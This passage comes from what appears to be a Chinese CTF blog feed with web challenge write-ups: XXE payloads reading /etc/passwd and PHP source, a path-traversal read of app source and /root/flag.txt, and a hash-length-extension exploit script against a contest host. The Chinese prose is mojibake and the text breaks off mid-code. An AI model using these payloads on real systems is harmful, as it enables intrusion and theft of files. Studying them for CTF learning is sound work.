<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥è¯»åˆ°passwdçš„ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸»è¦å°±æ˜¯æ‰¾åˆ°flagå°±å¥½äº†ï¼Œæœ€åæ˜¯åœ¨index.phpé‡Œæ‰¾åˆ°äº†flagï¼Œç”±äºphpæ–‡ä»¶é‡Œæœ‰&lt;ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥åˆ©ç”¨fileåè®®è¯»çš„æ—¶å€™ä¼šå‡ºç°è§£æé”™è¯¯å¯¼è‡´æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æ¢ä¸€ä¸ªç¼–ç çš„åè®®è¯»å°±å¥½äº†æ¯”å¦‚php://filter</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/convert.base64-encode/resource=index.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.phpæºç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$data = @file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$resp = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//$flag='flag&#123;1900cb98-96c4-45ac-a22e-86da06d59a3e&#125;';</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">    $dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span></span><br><span class="line"><span class="php">    ob_start();</span></span><br><span class="line"><span class="php">    $res  = $dom-&gt;textContent;</span></span><br><span class="line"><span class="php">    $resp = ob_get_contents();</span></span><br><span class="line"><span class="php">    ob_end_clean();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($res)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($res);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"contactBody"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>è¯·è¾“å…¥å§“å<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"name entry "</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">placeholder</span>=<span class="string">"Your Name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"submit entry"</span> <span class="attr">onclick</span>=<span class="string">"func()"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shadow"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// document.getElementById().value</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span></span><br><span class="line"><span class="handlebars"><span class="xml">            '<span class="tag">&lt;<span class="name">\?xml</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">encoding</span>=<span class="string">"UTF-8"</span>\?&gt;</span>' +</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;feedback&gt;'</span> +</span></span><br><span class="line"><span class="javascript">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;/feedback&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xml);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line">            if (xmlhttp.readyState == 4) &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.readyState);</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> res = xmlhttp.responseText;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="actionscript">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span></span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h3><p>ä¸»è¦æ€è·¯å°±æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶åã€‚æ–‡ä»¶åä¼šè¢«ç¼–ç ï¼Œå¤šæµ‹å‡ æ¬¡å°±å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªå˜è¡¨çš„base64ç¼–ç ï¼Œbase64ç¼–ç æ˜¯å›ºå®š3ä¸ªå­—ç¬¦ç¼–ç ä¸ºå›ºå®šçš„4ä¸ªå­—ç¬¦ï¼Œé¢˜ç›®çš„è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œnameå‚æ•°åè·Ÿä»»æ„æ–‡ä»¶çš„å˜è¡¨ç¼–ç çš„å€¼ï¼Œæ‰€ä»¥æ ¹æ®ä¸Šä¼ çš„æ–‡ä»¶åè¿›è·å–å¯¹åº”çš„ç¼–ç ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ–‡ä»¶åéœ€è¦æ„é€ ï¼Œæ–‡ä»¶åçš„é•¿åº¦éœ€è¦æ˜¯3çš„å€æ•°æ‰èƒ½ç¡®å®šæœ€åçš„æ–‡ä»¶åï¼Œå¹¶ä¸”éšä¾¿è¾“å…¥çš„æŠ¥é”™ä¿¡æ¯ä¸æ˜¯apache+phpçš„ï¼Œæœ€åæ‰ç¡®å®šæ˜¯ä¸€ä¸ªFlaskæ¨¡æ‹Ÿçš„phpï¼Œéª—äººç”¨çš„<del>~</del></p>
<p>æ‰€ä»¥ç°åœ¨è®²ä¸‹å…·ä½“æ“ä½œæ­¥éª¤ï¼š</p>
<ul>
<li>è®¾ç½®è¦è¯»çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚è¦è¯»çš„æ˜¯passwdæ–‡ä»¶ï¼‰,è®¾ç½®ä¸Šä¼ çš„æ–‡ä»¶åä¸ºâ€™../.././/etc/passwdâ€™ï¼ˆæµ‹è¯•å¯ä»¥å‘ç°æ˜¯2å±‚ç›®å½•ï¼Œé•¿åº¦è¦æ˜¯3çš„å€æ•°ï¼‰</li>
<li>åˆ†æ®µè¿›è¡Œä¸Šä¼ ï¼Œæ”¶é›†å„æ®µçš„ç¼–ç åçš„å­—ç¬¦è¿›è¡Œæ‹¼æ¥ï¼Œæ¯”å¦‚axb8axb8axnVSml8jmNBjUS9</li>
<li>è®¿é—®img.php?name=[æ–‡ä»¶ç¼–ç åçš„ç¼–ç ]å°±å¯ä»¥è¯»å–åˆ°ç›¸åº”çš„æ–‡ä»¶</li>
</ul>
<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-2fda3cd70b9dfd2a.png" alt></p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯æ‰¾flagçš„è·¯å¾„ï¼Œç”±äºæˆ‘ä»¬ä¸çŸ¥é“å„ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œæ‰€ä»¥ç”¨/proc/self/æ¥ä»…éœ€è¯»å–</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/./</span>proc<span class="regexp">/self/</span>cmdline   <span class="comment">#å¯ä»¥è¯»åˆ°å½“å‰æœåŠ¡ä¸ºapp.py</span></span><br><span class="line"><span class="comment">#python3 app.py sleep 36000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">../..<span class="comment">//proc/self/cwd/app.py  #å¯ä»¥è¯»åˆ°æœ¬é¢˜çš„æºç </span></span><br><span class="line">#####################################</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return <span class="string">'.'</span> <span class="keyword">in</span> filename and \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">@app.route(<span class="string">'/index.php'</span>)</span><br><span class="line">def home():</span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    return render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload.php'</span>, methods=[<span class="string">'POST'</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file and allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> not os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        else:</span><br><span class="line">            return <span class="string">"ä¸å…è®¸çš„æ ¼å¼"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    return redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/img.php'</span>, methods=[<span class="string">'GET'</span>])</span><br><span class="line">def img():</span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    return Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure>

<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">../../././proc/self/cwd/templates/upload.html  </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                ä¸Šä¼ å›¾ç‰‡</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ä¸Šä¼ "</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> file %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img.php?name=</span></span></span><span class="template-variable">&#123;&#123; file &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    è¯·ä¸Šä¼ ä¸€å¼ å›¾ç‰‡</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- flag in /root/flag.txt ! Get it ! --&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥flagåœ¨/root/flag.txtä¸‹äº†æœ€ååˆ©ç”¨</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>root<span class="regexp">/flag.txt     #è¯»flag</span></span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-f4164106f9873a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h3 id="0x04-æŒ‰Fæ³¨å…¥"><a href="#0x04-æŒ‰Fæ³¨å…¥" class="headerlink" title="0x04 æŒ‰Fæ³¨å…¥"></a>0x04 æŒ‰Fæ³¨å…¥</h3><p>fbctf2019é¢˜ç›®çš„ä¿®æ”¹é¢˜ï¼Œç›®å‰åªåšåˆ°äº†å›æ˜¾æ•°æ®åº“ä¿¡æ¯ï¼Œè¿˜æ²¡è¯»åˆ°flagï¼Œç­‰å¤ç°å®Œå†å†™<br>å‚è€ƒï¼š<a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 De1CTF Web_wp</title>
    <url>/2019/08/05/2019-De1CTF-Web-wp/</url>
    <content><![CDATA[<h3 id="0x01-SSRF-ME"><a href="#0x01-SSRF-ME" class="headerlink" title="0x01 SSRF ME"></a>0x01 SSRF ME</h3><p>è¿™é¢˜æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œæ ¹æ®ä»£ç é€»è¾‘æ„é€ hashæ‹“å±•æ”»å‡»ï¼Œå‘çš„å°±æ˜¯æ‰¾flagæ‰¾äº†åŠå¤©ï¼Œæ‰¾åˆ°äº†ç„¶åæ”¾æç¤ºäº†â€¦â€¦ç›´æ¥è´´ä»£ç </p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># -*- codin<span class="variable">g:</span> utf-<span class="number">8</span> -*-</span><br><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib.parse <span class="keyword">as</span> <span class="keyword">change</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readfile</span> = <span class="string">'flag.txt'</span></span><br><span class="line">url1 =  <span class="string">'http://139.180.128.86/geneSign?param='</span> + <span class="built_in">readfile</span></span><br><span class="line">req = requests.<span class="built_in">get</span>(url = url1)</span><br><span class="line"><span class="keyword">sign</span> = req.content</span><br><span class="line">hash_sign = hashpumpy.hashpump(<span class="keyword">sign</span>, <span class="built_in">readfile</span> + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">sign_next = hash_sign[<span class="number">0</span>]</span><br><span class="line">action_next = <span class="keyword">change</span>.quote(hash_sign[<span class="number">1</span>][<span class="built_in">len</span>(<span class="built_in">readfile</span>):])</span><br><span class="line">url2 = <span class="string">'http://139.180.128.86/De1ta?param='</span>+<span class="built_in">readfile</span></span><br><span class="line">result = requests.<span class="built_in">get</span>(url = url2, cookies=&#123;<span class="string">'sign'</span>: sign_next, <span class="string">'action'</span>: action_next&#125;)</span><br><span class="line"><span class="keyword">print</span>(result.content)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-33565c3a822f2594.png" alt></p>
<h3 id="0x02-shellshellshell"><a href="#0x02-shellshellshell" class="headerlink" title="0x02 shellshellshell"></a>0x02 shellshellshell</h3><p>ä¸€å±‚ç™»å½•å’Œå»å¹´çš„N1ctfçš„easyphpæºç åŸºæœ¬ä¸€æ ·çš„ï¼Œæ‰€ä»¥æ¼æ´ç‚¹ä¹Ÿæ˜¯åŸºæœ¬ä¸€æ ·çš„ï¼Œgithubä¸Šæœ‰äººå†™äº†easyphpçš„æ¼æ´åˆ©ç”¨è„šæœ¬<a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</a>ï¼Œå¯ä»¥ç”¨ssrfè„šæœ¬æŠ“å–åˆ°adminç”¨æˆ·çš„session</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-0dd6421b8b45c056.png" alt></p>
<p>ç›´æ¥åˆ©ç”¨sessionç™»å½•adminç”¨æˆ·ï¼Œé¢˜ç›®åœ¨adminç”¨æˆ·çš„ä¸Šä¼ ç‚¹æ²¡æœ‰åšé™åˆ¶ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªshellå°±å¥½ã€‚</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-dc1712e3b4f43acd.png" alt><br>è€Œä¸”åœ¨ä¸Šä¼ ç‚¹æç¤ºäº†flagåœ¨å†…ç½‘é‡Œï¼Œæ‰€ä»¥ä¸Šä¼ ä¸ªshellåç›®çš„ä¹Ÿå¾ˆæ˜ç¡®ï¼Œå»çœ‹ä¸€ä¸‹/etc/hosts</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>	localhost</span><br><span class="line">::<span class="number">1</span>	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>	ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>	ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>	ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>	ip6-allrouters</span><br><span class="line"><span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span>	df459fa2cbad</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ª172.18.0.3çš„å†…ç½‘åœ°å€ï¼Œæ‰€ä»¥æ­ä¸ªä»£ç†å‡ºæ¥æ‰«æä¸€ä¸‹Cæ®µåœ°å€ï¼ˆå¼ºçƒˆå®‰åˆ©ä¸€æ³¢FCNï¼‰ï¼Œæ‰«æåˆ°172.18.0.2ä¸Šå¼€äº†80ç«¯å£ï¼Œä¸Šæ¥å°±æ˜¯ä¸€ä¸ªä»£ç å®¡è®¡</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">    @mkdir($sandbox);</span></span><br><span class="line"><span class="php">    @chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_array($filename)) </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = explode(<span class="string">'.'</span>, $filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $ext = end($filename);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span 